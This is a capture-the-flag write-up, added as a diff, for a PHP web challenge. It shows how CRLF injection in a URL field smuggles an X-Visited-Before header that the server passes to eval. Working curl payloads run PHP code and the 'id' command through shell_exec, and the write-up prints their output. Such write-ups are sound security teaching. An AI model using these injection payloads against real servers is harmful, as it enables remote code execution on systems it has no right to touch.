@@ -1,0 +1,206 @@
+<h1 id="clean-url-as-a-service">Clean url as a Service</h1>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/164913784-f3c5e9b7-e7c1-48fa-be5e-1db086f0987f.png" alt="image" /></p>
+
+<p>Upon visiting the site, we can see there is an input field which asks for an url. The placeholder is set to https://www.example.tld/cleanmepls?name=joe&amp;age=13&amp;address=very-very-very-long-string so let’s try with a simple url such as:</p>
+
+<p>https://google.com/?test=test</p>
+
+<p>Upon clicking on the <code class="language-plaintext highlighter-rouge">clean</code> button , a POST request is sent to the <code class="language-plaintext highlighter-rouge">cleaner.php</code> endpoint and in the body of the request you can see our URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
+Host: 127.0.0.1:1337
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+
+url=https%3A%2F%2Fgoogle.com%2F%3Ftest%3Dtest
+</code></pre></div></div>
+
+<p>The server returns this output:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/164913766-6885efbf-08a1-413a-b5d2-7b9e0e269a84.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>There your cleaned url: google.com
+Thank you For Using our Service!
+</code></pre></div></div>
+
+<p>OK, from this output it’s clear that the application just takes an URL as an input and returns the host part as the output. Or is to so?</p>
+
+<hr />
+
+<p>Let’s dive deep into the source code to figure it out:
+We were provided with two php files <code class="language-plaintext highlighter-rouge">index.php</code> and <code class="language-plaintext highlighter-rouge">cleaner.php</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Cleaner.php</code> (section 1)</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="p">){</span>
+
+<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;img src='https://imgur.com/x7BCUsr.png'&gt;"</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+
+<span class="k">echo</span> <span class="s2">"&lt;br&gt;There your cleaned url: "</span><span class="mf">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
+<span class="k">echo</span> <span class="s2">"&lt;br&gt;Thank you For Using our Service!"</span><span class="p">;</span>
+
+
+<span class="k">function</span> <span class="n">tryandeval</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
+                <span class="k">echo</span> <span class="s2">"&lt;br&gt;How many you visited us "</span><span class="p">;</span>
+                <span class="k">eval</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+        <span class="p">}</span>
+
+
+<span class="k">foreach</span> <span class="p">(</span><span class="nb">getallheaders</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">error_log</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s2">"X-Visited-Before"</span><span class="p">){</span> <span class="c1">// [2]</span>
+		<span class="nf">tryandeval</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+	<span class="p">}}</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">index.php</code> (section 2)</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="k">and</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nf">clean_and_send</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+	<span class="k">function</span> <span class="n">clean_and_send</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+		<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Cleaning url: "</span><span class="mf">.</span><span class="nv">$url</span><span class="p">);</span>
+			<span class="nv">$uncleanedURL</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span> <span class="c1">// should be not used anymore</span>
+			<span class="nv">$values</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+			<span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="nv">$values</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]);</span>
+			<span class="nv">$query</span> <span class="o">=</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+			<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'host'</span><span class="o">=&gt;</span><span class="nv">$query</span><span class="p">);</span>
+			<span class="nv">$cleanerurl</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1/cleaner.php"</span><span class="p">;</span>
+   			<span class="nv">$stream</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$cleanerurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="nb">stream_context_create</span><span class="p">([</span><span class="s1">'http'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="c1">//[1]</span>
+			<span class="s1">'method'</span> <span class="o">=&gt;</span> <span class="s1">'POST'</span><span class="p">,</span>
+			<span class="s1">'header'</span> <span class="o">=&gt;</span> <span class="s2">"X-Original-URL: </span><span class="nv">$uncleanedURL</span><span class="s2">"</span><span class="p">,</span>
+			<span class="s1">'content'</span> <span class="o">=&gt;</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+			<span class="p">]</span>
+			<span class="p">]));</span>
+    			<span class="k">echo</span> <span class="nv">$stream</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">index.php</code> code starts with a <em>if condition check</em> which basically checks for two things the <code class="language-plaintext highlighter-rouge">REQUEST_METHOD</code>  and the <code class="language-plaintext highlighter-rouge">url</code> parameter. If the request method is <em>POST</em> and in the request body there is <code class="language-plaintext highlighter-rouge">url</code> parameter.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">clean_and_send</code> function is called and the url is directly passed as an <em>arguement</em> to this function.</p>
+
+<p>In the function, the argument url is stored in the <code class="language-plaintext highlighter-rouge">$uncleanedURL</code> variable.</p>
+
+<p>This array is then stored in the <code class="language-plaintext highlighter-rouge">$values</code> variable.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">parse_url</span><span class="p">(</span><span class="s2">"https://google.com/?test=test"</span><span class="p">));</span>
+<span class="k">Array</span>
+<span class="p">(</span>
+    <span class="p">[</span><span class="n">scheme</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">https</span>
+    <span class="p">[</span><span class="n">host</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">google</span><span class="mf">.</span><span class="n">com</span>
+    <span class="p">[</span><span class="n">path</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">/</span>
+    <span class="p">[</span><span class="n">query</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">test</span><span class="o">=</span><span class="n">test</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<p>By executing the challenge code line by line, you can get a understanding of what the code does.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="nv">$values</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]);</span>
+<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nv">$host</span><span class="p">;</span>
+<span class="no">PHP</span> <span class="nc">Notice</span><span class="o">:</span>  <span class="k">Array</span> <span class="n">to</span> <span class="n">string</span> <span class="n">conversion</span> <span class="n">in</span> <span class="n">php</span> <span class="n">shell</span> <span class="n">code</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">1</span>
+<span class="k">Array</span>
+<span class="n">php</span> <span class="o">&gt;</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span>
+<span class="k">Array</span>
+<span class="p">(</span>
+    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">google</span><span class="mf">.</span><span class="n">com</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<p>In line <code class="language-plaintext highlighter-rouge">[1]</code> , using <em>file_get_contents</em>  a POST request to the <code class="language-plaintext highlighter-rouge">/cleaner.php</code>  is made along with one additional header <code class="language-plaintext highlighter-rouge">'header' =&gt; "X-Original-URL: $uncleanedURL"</code> , on the side note we have full control over <code class="language-plaintext highlighter-rouge">X-Original-URL</code> header value let’s keep this in mind and check the <code class="language-plaintext highlighter-rouge">cleaner.php</code> code to understand how it handles the POST request.</p>
+
+<p>On the very first line in <code class="language-plaintext highlighter-rouge">cleaner.php</code>, there is a condition to check whether the client’s IP is equal to 127.0.0.1 or not.</p>
+
+<p>There is one interesting function <code class="language-plaintext highlighter-rouge">tryandeval</code> which is only invoked if the POST request contains the <code class="language-plaintext highlighter-rouge">X-Visited-Before</code> header (the value of this header is passed as an arguement to tryandeval function) it then passes the header value to <code class="language-plaintext highlighter-rouge">eval</code>.</p>
+
+<p>So now we have our goal clear of what we need to do, we have to find a way to include <code class="language-plaintext highlighter-rouge">X-Visited-Before</code> header in the POST request which is sent to the <code class="language-plaintext highlighter-rouge">cleaner.php</code> endpoint ([1])</p>
+
+<p>As the cleaner.php endpoint was accessible by directly visiting the http://challengesite.xyz/cleaner.php , I thought if there’s any way to bypass the <code class="language-plaintext highlighter-rouge">$_SERVER["REMOTE_ADDR"] != "127.0.0.1"</code> check we can easily add the required <code class="language-plaintext highlighter-rouge">X-Visited-Before</code> header and execute any command we want.</p>
+
+<p>After reading some articles &amp; stackoverflow posts, I found that it was the correct way of validating client’s IP.So I then started looking at other part of the [1] line.</p>
+
+<p>Remeber earlier I told to keep note of the <code class="language-plaintext highlighter-rouge">X-Original-URL</code> , as we have full control over it’s value we can try including crlf characters to check if header injection is possible or not.</p>
+
+<p>It was just assumption what would happen if I run the following code:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">$uncleanedURL</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'uncleanedURL'</span><span class="p">];</span>
+
+
+<span class="k">function</span> <span class="n">test</span><span class="p">(</span><span class="nv">$uncleanedURL</span><span class="p">){</span>
+      <span class="nv">$cleanerurl</span> <span class="o">=</span> <span class="s2">"https://en2celr7rewbul.m.pipedream.net"</span><span class="p">;</span>
+      <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">;</span>
+      <span class="nv">$stream</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$cleanerurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="nb">stream_context_create</span><span class="p">([</span><span class="s1">'http'</span> <span class="o">=&gt;</span> <span class="p">[</span> 
+        <span class="s1">'method'</span> <span class="o">=&gt;</span> <span class="s1">'POST'</span><span class="p">,</span>
+        <span class="s1">'header'</span> <span class="o">=&gt;</span> <span class="s2">"X-Original-URL: </span><span class="nv">$uncleanedURL</span><span class="s2">"</span><span class="p">,</span>
+        <span class="s1">'content'</span> <span class="o">=&gt;</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">]</span>
+    <span class="p">]));</span>
+<span class="p">}</span>
+
+<span class="nf">test</span><span class="p">(</span><span class="nv">$uncleanedURL</span><span class="p">);</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://127.0.0.1:1337/test.php?uncleanedURL=https://google.com/?test=test"</span>
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/164913802-1f44c24b-5316-49fb-9e40-267ba9b350f8.png" alt="chrome_3LXzVAMNyB" /></p>
+
+<p>Now let’s try to add a new header using <code class="language-plaintext highlighter-rouge">%0AX-Hacked:shirley</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://127.0.0.1:1337/test.php?uncleanedURL=https://google.com/?test=test%0AX-Hacked:shirley"</span>
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/164913805-3aa1a4b6-e595-4748-8a86-5315dfe045de.png" alt="chrome_VO98hEuiO3" /></p>
+
+<p>We have successfully added a new header 😎</p>
+
+<hr />
+
+<p>Coming to back to the challenge code, let’s try to input the following url: <code class="language-plaintext highlighter-rouge">https://google.com/?test=test%0AX-Visited-Before:1</code></p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/164913824-7c24ce34-f48e-4f27-8917-075975278870.png" alt="ubuntu_sv5JH76CN8" /></p>
+
+<p>The application didn’t even returned any message , if we look at the above screenshot:</p>
+
+<p>On the right hand side you can see that we have successfully added the <code class="language-plaintext highlighter-rouge">X-Visited-Before</code> header to the request , but it seems an error was triggered by the <code class="language-plaintext highlighter-rouge">eval</code> function.</p>
+
+<p>eval function executes any given string as a php code, <code class="language-plaintext highlighter-rouge">shirley</code> was provided as a string to the eval function. As <code class="language-plaintext highlighter-rouge">shirley</code> string isn’t a valid php code the error was triggered.</p>
+
+<p>Let’s this try something simple: <code class="language-plaintext highlighter-rouge">echo 1337;</code> (semicolon is necessary as in php every statement should end with a semicolon)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:1337/ <span class="nt">-d</span> <span class="s2">"url=https://google.com/%0aX-Visited-Before:echo 1337;"</span> <span class="nt">-X</span> POST
+</code></pre></div></div>
+
+<p>We get the following response:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;br&gt;</span>There your cleaned url: google.com<span class="nt">&lt;br&gt;</span>Thank you For Using our Service!<span class="nt">&lt;br&gt;</span>How many you visited us 1337
+</code></pre></div></div>
+
+<p>Bingoo ! We can also execute any system command such as <code class="language-plaintext highlighter-rouge">id</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:1337/ <span class="nt">-d</span> <span class="s2">"url=https://google.com/%0aX-Visited-Before:echo shell_exec('id');"</span> <span class="nt">-X</span> POST 
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br&gt;There your cleaned url: google.com&lt;br&gt;Thank you For Using our Service!&lt;br&gt;How many you visited us uid=1000(shirley) gid=1000(shirley) groups=1000(shirley),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo)
+</code></pre></div></div>
+
+<p>In the end when I actually used the same payload on the challenge site, it didn’t worked for some reasons which I wasn’t aware. I tried some payload variations such as <code class="language-plaintext highlighter-rouge">%0A%0Dheader:value</code> but still couldn’t figured it out.
+As I was making no progress , I decided to contact the author of the challenge and explained everything to him. Turns out the problem was that the challenge site was running on Apache webserver and I was using the inbuilt php webserver.</p>
+
+<p>The final working payload which also worked on the challenge site was: <code class="language-plaintext highlighter-rouge">https://google.com/%0D%0AX-Visited-Before:echo+1;</code></p>
